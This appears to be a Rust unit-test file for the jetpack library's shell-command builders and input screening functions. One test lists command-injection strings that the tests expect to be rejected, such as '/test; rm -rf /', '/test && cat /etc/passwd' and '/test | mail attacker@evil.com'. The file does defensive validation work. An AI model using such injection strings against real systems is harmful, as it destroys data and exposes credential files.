use jetpack::tasks::cmd_library::*;
use jetpack::inventory::hosts::HostOSType;
use jetpack::tasks::files::Recurse;

#[test]
fn test_screen_path_valid() {
    let path = "/home/user/file.txt".to_string();
    let result = screen_path(&path);
    assert!(result.is_ok());
    assert_eq!(result.unwrap(), "/home/user/file.txt");
}

#[test]
fn test_screen_path_with_spaces() {
    let path = "/home/user/my file.txt".to_string();
    let result = screen_path(&path);
    assert!(result.is_ok());
    assert_eq!(result.unwrap(), "/home/user/my file.txt");
}

#[test]
fn test_screen_path_with_special_chars() {
    let path = "/home/user/file;rm -rf /".to_string();
    let result = screen_path(&path);
    assert!(result.is_err());
}

#[test]
fn test_screen_general_input_strict_valid() {
    let input = "simple-text_123".to_string();
    let result = screen_general_input_strict(&input);
    assert!(result.is_ok());
    assert_eq!(result.unwrap(), "simple-text_123");
}

#[test]
fn test_screen_general_input_strict_invalid_chars() {
    let invalid_chars = vec![";", "{", "}", "(", ")", "<", ">", "&", "*", "|", "=", "?", "[", "]", "$", "%", "`"];
    
    for ch in invalid_chars {
        let input = format!("test{}input", ch);
        let result = screen_general_input_strict(&input);
        assert!(result.is_err());
        assert!(result.unwrap_err().contains("illegal characters found"));
    }
}

#[test]
fn test_screen_general_input_loose_valid() {
    let input = "simple-text_123=value".to_string();
    let result = screen_general_input_loose(&input);
    assert!(result.is_ok());
    assert_eq!(result.unwrap(), "simple-text_123=value");
}

#[test]
fn test_screen_general_input_loose_allows_equals() {
    let input = "key=value".to_string();
    let result = screen_general_input_loose(&input);
    assert!(result.is_ok());
}

#[test]
fn test_screen_general_input_loose_invalid_chars() {
    let invalid_chars = vec![";", "<", ">", "&", "*", "?", "{", "}", "[", "]", "$", "`"];
    
    for ch in invalid_chars {
        let input = format!("test{}input", ch);
        let result = screen_general_input_loose(&input);
        assert!(result.is_err());
        assert!(result.unwrap_err().contains("illegal characters detected"));
    }
}

#[test]
fn test_screen_mode_valid_octal() {
    let valid_modes = vec!["755", "644", "777", "000", "400", "0o755", "0o644", "12345"];
    
    for mode in valid_modes {
        let result = screen_mode(&mode.to_string());
        assert!(result.is_ok());
        assert_eq!(result.unwrap(), mode);
    }
}

#[test]
fn test_screen_mode_invalid() {
    let invalid_modes = vec!["abc", "999", "888", "7.5", "0o999", "0o888", "755x", "75.5", "x755"];
    
    for mode in invalid_modes {
        let result = screen_mode(&mode.to_string());
        assert!(result.is_err(), "Mode '{}' should be invalid", mode);
        assert!(result.unwrap_err().contains("not an octal string"));
    }
}


#[test]
fn test_get_mode_command_linux() {
    let path = "/test/file".to_string();
    let result = get_mode_command(HostOSType::Linux, &path);
    assert!(result.is_ok());
    assert_eq!(result.unwrap(), "stat --format '%a' '/test/file'");
}

#[test]
fn test_get_mode_command_macos() {
    let path = "/test/file".to_string();
    let result = get_mode_command(HostOSType::MacOS, &path);
    assert!(result.is_ok());
    assert_eq!(result.unwrap(), "stat -f '%A' '/test/file'");
}

#[test]
fn test_get_sha512_command_linux() {
    let path = "/test/file".to_string();
    let result = get_sha512_command(HostOSType::Linux, &path);
    assert!(result.is_ok());
    assert_eq!(result.unwrap(), "sha512sum '/test/file'");
}

#[test]
fn test_get_sha512_command_macos() {
    let path = "/test/file".to_string();
    let result = get_sha512_command(HostOSType::MacOS, &path);
    assert!(result.is_ok());
    assert_eq!(result.unwrap(), "shasum -b -a 512 '/test/file'");
}

#[test]
fn test_get_ownership_command() {
    let path = "/test/file".to_string();
    let result = get_ownership_command(HostOSType::Linux, &path);
    assert!(result.is_ok());
    assert_eq!(result.unwrap(), "ls -ld '/test/file'");
}

#[test]
fn test_get_is_directory_command() {
    let path = "/test/dir".to_string();
    let result = get_is_directory_command(HostOSType::Linux, &path);
    assert!(result.is_ok());
    assert_eq!(result.unwrap(), "ls -ld '/test/dir'");
}

#[test]
fn test_get_touch_command() {
    let path = "/test/file".to_string();
    let result = get_touch_command(HostOSType::Linux, &path);
    assert!(result.is_ok());
    assert_eq!(result.unwrap(), "touch '/test/file'");
}

#[test]
fn test_get_create_directory_command() {
    let path = "/test/dir".to_string();
    let result = get_create_directory_command(HostOSType::Linux, &path);
    assert!(result.is_ok());
    assert_eq!(result.unwrap(), "mkdir -p '/test/dir'");
}

#[test]
fn test_get_delete_file_command() {
    let path = "/test/file".to_string();
    let result = get_delete_file_command(HostOSType::Linux, &path);
    assert!(result.is_ok());
    assert_eq!(result.unwrap(), "rm -f '/test/file'");
}

#[test]
fn test_get_delete_directory_command_no_recurse() {
    let path = "/test/dir".to_string();
    let result = get_delete_directory_command(HostOSType::Linux, &path, Recurse::No);
    assert!(result.is_ok());
    assert_eq!(result.unwrap(), "rmdir '/test/dir'");
}

#[test]
fn test_get_delete_directory_command_recurse() {
    let path = "/test/dir".to_string();
    let result = get_delete_directory_command(HostOSType::Linux, &path, Recurse::Yes);
    assert!(result.is_ok());
    assert_eq!(result.unwrap(), "rm -rf '/test/dir'");
}

#[test]
fn test_set_owner_command_no_recurse() {
    let path = "/test/file".to_string();
    let owner = "user".to_string();
    let result = set_owner_command(HostOSType::Linux, &path, &owner, Recurse::No);
    assert!(result.is_ok());
    assert_eq!(result.unwrap(), "chown 'user' '/test/file'");
}

#[test]
fn test_set_owner_command_recurse() {
    let path = "/test/dir".to_string();
    let owner = "user".to_string();
    let result = set_owner_command(HostOSType::Linux, &path, &owner, Recurse::Yes);
    assert!(result.is_ok());
    assert_eq!(result.unwrap(), "chown -R 'user' '/test/dir'");
}

#[test]
fn test_set_group_command_no_recurse() {
    let path = "/test/file".to_string();
    let group = "group".to_string();
    let result = set_group_command(HostOSType::Linux, &path, &group, Recurse::No);
    assert!(result.is_ok());
    assert_eq!(result.unwrap(), "chgrp 'group' '/test/file'");
}

#[test]
fn test_set_group_command_recurse() {
    let path = "/test/dir".to_string();
    let group = "group".to_string();
    let result = set_group_command(HostOSType::Linux, &path, &group, Recurse::Yes);
    assert!(result.is_ok());
    assert_eq!(result.unwrap(), "chgrp -R 'group' '/test/dir'");
}

#[test]
fn test_set_mode_command_no_recurse() {
    let path = "/test/file".to_string();
    let mode = "755".to_string();
    let result = set_mode_command(HostOSType::Linux, &path, &mode, Recurse::No);
    assert!(result.is_ok());
    assert_eq!(result.unwrap(), "chmod '755' '/test/file'");
}

#[test]
fn test_set_mode_command_recurse() {
    let path = "/test/dir".to_string();
    let mode = "755".to_string();
    let result = set_mode_command(HostOSType::Linux, &path, &mode, Recurse::Yes);
    assert!(result.is_ok());
    assert_eq!(result.unwrap(), "chmod -R '755' '/test/dir'");
}

#[test]
fn test_get_arch_command() {
    let result = get_arch_command(HostOSType::Linux);
    assert!(result.is_ok());
    assert_eq!(result.unwrap(), "uname -m");
    
    let result = get_arch_command(HostOSType::MacOS);
    assert!(result.is_ok());
    assert_eq!(result.unwrap(), "uname -m");
}

#[test]
fn test_command_injection_prevention() {
    // Test various command injection attempts
    let evil_paths = vec![
        "/test; rm -rf /",
        "/test && cat /etc/passwd",
        "/test | mail attacker@evil.com",
        "/test`whoami`",
        "/test$(whoami)",
        "/test > /dev/null; echo hacked",
    ];
    
    for evil_path in evil_paths {
        let result = screen_path(&evil_path.to_string());
        assert!(result.is_err(), "Should reject path: {}", evil_path);
    }
}

#[test]
fn test_trimmed_inputs() {
    let path = "  /test/file  ".to_string();
    let result = screen_path(&path);
    assert!(result.is_ok());
    assert_eq!(result.unwrap(), "/test/file");
    
    let input = "  simple-text  ".to_string();
    let result = screen_general_input_strict(&input);
    assert!(result.is_ok());
    assert_eq!(result.unwrap(), "simple-text");
}